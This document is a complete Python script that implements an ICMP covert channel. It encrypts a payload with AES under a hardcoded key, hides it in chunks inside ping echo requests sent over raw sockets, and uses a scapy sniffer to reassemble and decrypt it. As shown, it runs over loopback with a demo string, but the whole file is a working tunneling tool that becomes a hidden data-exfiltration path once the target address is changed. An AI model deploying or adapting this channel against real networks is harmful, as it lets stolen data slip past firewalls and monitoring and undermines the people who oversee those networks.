# Script for Sending and Receiving Covert Payload via ICMP on Windows Machine

import os
import time
import base64
import socket
import struct
from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import threading

# Configuration
received_chunks = {}
SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
END_MARKER = "<END>"  # Marker to indicate end of transmission
all_chunks_received = threading.Event()

# ICMP Payload Sender
def send_covert_payload_icmp(payload):
    encrypted_payload = encrypt_payload(payload)
    encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode()).decode().rstrip('=')
    chunk_size = 16  # Reduced chunk size
    payload_chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]

    target_ip = "127.0.0.1"  # Update IP address if needed
    packet_id = os.getpid() & 0xFFFF
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))

    for seq_num, chunk in enumerate(payload_chunks):
        header = struct.pack("!BBHHH", 8, 0, 0, packet_id, seq_num)  # ICMP Echo Request, code 0, checksum 0
        data = struct.pack("d", time.time()) + chunk.encode()
        checksum = calculate_checksum(header + data)
        header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, seq_num)
        packet = header + data

        sock.sendto(packet, (target_ip, 1))
        print(f"[Sender] ICMP packet sent to {target_ip} with chunk: {chunk}")
        time.sleep(1.5)  # Increased delay to ensure the sniffer processes each packet properly

    send_end_marker_icmp(sock, target_ip, packet_id)

# ICMP End Marker Sender
def send_end_marker_icmp(sock, target_ip, packet_id):
    header = struct.pack("!BBHHH", 8, 0, 0, packet_id, 9999)  # Using a distinct sequence number for the end marker
    data = struct.pack("d", time.time()) + END_MARKER.encode()
    checksum = calculate_checksum(header + data)
    header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, 9999)
    packet = header + data

    sock.sendto(packet, (target_ip, 1))
    print(f"[Sender] ICMP packet sent to {target_ip} with end marker")

# ICMP Checksum Calculation
def calculate_checksum(source_string):
    count_to = (len(source_string) // 2) * 2
    total = 0
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        total = total + this_val
        total = total & 0xffffffff
        count = count + 2

    if count_to < len(source_string):
        total = total + source_string[-1]
        total = total & 0xffffffff

    total = (total >> 16) + (total & 0xffff)
    total = total + (total >> 16)
    answer = ~total
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

# Encryption function
def encrypt_payload(payload):
    key = hashlib.sha256(SECRET_KEY.encode()).digest()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    iv = base64.urlsafe_b64encode(cipher.iv).decode().rstrip('=')
    ct = base64.urlsafe_b64encode(ct_bytes).decode().rstrip('=')
    return f"{iv}:{ct}"

# Decryption function
def decrypt_payload(encrypted_payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()
        if ":" not in encrypted_payload:
            raise ValueError("Missing IV and ciphertext separator.")
        iv, ct = encrypted_payload.split(":")
        iv = base64.urlsafe_b64decode(iv + '=' * (-len(iv) % 4))
        ct = base64.urlsafe_b64decode(ct + '=' * (-len(ct) % 4))
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    except ValueError as e:
        raise ValueError(f"Decryption failed due to incorrect data format: {e}")
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# Packet Sniffer
def packet_sniffer():
    def icmp_sniffer(packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw):  # ICMP Echo Request
            try:
                raw_data = packet[Raw].load.decode(errors='ignore')
                timestamp_size = struct.calcsize("d")
                payload_data = raw_data[timestamp_size:]
                seq_num = packet[ICMP].seq

                print(f"[Sniffer] ICMP packet received with sequence number {seq_num}")

                if seq_num == 9999:  # End marker packet
                    payload_data = payload_data.replace(END_MARKER, "")
                    received_chunks[seq_num] = payload_data
                    time.sleep(1)  # Allow time for any remaining packets to arrive
                    reassembled_payload = ''.join([received_chunks[key] for key in sorted(received_chunks.keys()) if key != 9999])
                    decrypted_payload = decrypt_payload(reassembled_payload)
                    print(f"[Receiver] Reassembled and Decrypted Payload: {decrypted_payload}")
                    received_chunks.clear()
                    all_chunks_received.set()
                else:
                    received_chunks[seq_num] = payload_data

                print(f"[Sniffer] ICMP chunk received: {payload_data}")
                print(f"[Sniffer] Current received chunks: {received_chunks}")

            except Exception as e:
                print(f"[Sniffer] Error decoding ICMP packet: {e}")

    # Simplified packet filter to capture all ICMP packets
    sniff(filter="icmp", prn=icmp_sniffer, store=0)

# Run ICMP Tunneling
if __name__ == "__main__":
    # Start the sniffer thread
    print("[Main] Starting sniffer thread...")
    sniffer_thread = threading.Thread(target=packet_sniffer)
    sniffer_thread.daemon = True
    sniffer_thread.start()

    time.sleep(2)  # Give sniffer some time to initialize
    print("[Main] Sniffer thread started. Sending payload...")

    secret_payload = "This is a secret payload."
    send_covert_payload_icmp(secret_payload)

    # Wait for all chunks to be received
    all_chunks_received.wait(timeout=30)
    if not all_chunks_received.is_set():
        print("[Main] Warning: Not all chunks were received within the timeout period.")

    print("[Main] Payload transmission complete.")
